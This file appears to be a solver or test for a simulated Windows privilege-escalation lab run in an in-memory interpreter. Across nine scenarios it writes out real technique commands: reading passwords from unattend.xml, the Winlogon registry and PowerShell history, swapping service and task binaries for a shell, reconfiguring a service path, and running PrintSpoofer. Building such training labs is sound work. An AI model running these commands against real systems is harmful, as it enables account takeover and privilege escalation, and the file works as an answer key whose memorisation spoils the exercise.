// Runs only the in-memory Seventech interpreter and its inert fixture files.
export async function completeWindowsFixture(
  run: (command: string) => Promise<string>,
  index: number,
) {
  await run(`connect 10.77.0.${60 + index}`);
  if (index === 1) {
    const document = await run("type C:\\Windows\\Panther\\unattend.xml");
    const password = document.match(/<Value>([^<]+)<\/Value>/)?.[1];
    if (!password) throw new Error("Missing fixture account data");
    await run("runas /user:mantenimiento powershell");
    await run(password);
  }
  if (index === 2) {
    const document = await run(
      'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"',
    );
    const password = document.match(/DefaultPassword\s+REG_SZ\s+(\S+)/)?.[1];
    if (!password) throw new Error("Missing registry fixture account data");
    await run("runas /user:operador powershell");
    await run(password);
  }
  if (index === 3) {
    const document = await run(
      "type C:\\Users\\analista\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
    );
    const password = document.match(/-p (\S+)/)?.[1];
    if (!password) throw new Error("Missing history fixture account data");
    await run("runas /user:soporte powershell");
    await run(password);
  }
  if (index === 4) {
    await run("sc qc BackupAgent");
    await run("icacls C:\\ProgramData\\BackupAgent\\agent.exe");
    await run(
      "copy C:\\Tools\\shell.exe C:\\ProgramData\\BackupAgent\\agent.exe",
    );
    await run("sc start BackupAgent");
  }
  if (index === 5) {
    await run("sc qc Indexador");
    await run("icacls C:\\Apps");
    await run("copy C:\\Tools\\shell.exe C:\\Apps\\North.exe");
    await run("sc start Indexador");
  }
  if (index === 6) {
    await run("schtasks /query /fo LIST /v");
    await run("icacls C:\\ProgramData\\Cierre\\cierre.ps1");
    await run("copy C:\\Tools\\shell.ps1 C:\\ProgramData\\Cierre\\cierre.ps1");
    await run("schtasks /run /tn Cierre");
  }
  if (index === 7) {
    await run("sc sdshow Inventario");
    await run("sc config Inventario binPath= C:\\Tools\\shell.exe");
    await run("sc start Inventario");
  }
  if (index === 8) {
    await run("whoami /priv");
    await run("robocopy C:\\Evidence C:\\Temp proof.txt /b");
    return run("type C:\\Temp\\proof.txt");
  }
  if (index === 9) {
    await run("sc qc WebWorker");
    await run("icacls C:\\ProgramData\\WebWorker\\worker.exe");
    await run(
      "copy C:\\Tools\\shell.exe C:\\ProgramData\\WebWorker\\worker.exe",
    );
    await run("sc start WebWorker");
    await run("whoami /priv");
    await run("C:\\Tools\\PrintSpoofer.exe -i -c cmd");
  }
  return run("type C:\\Evidence\\proof.txt");
}
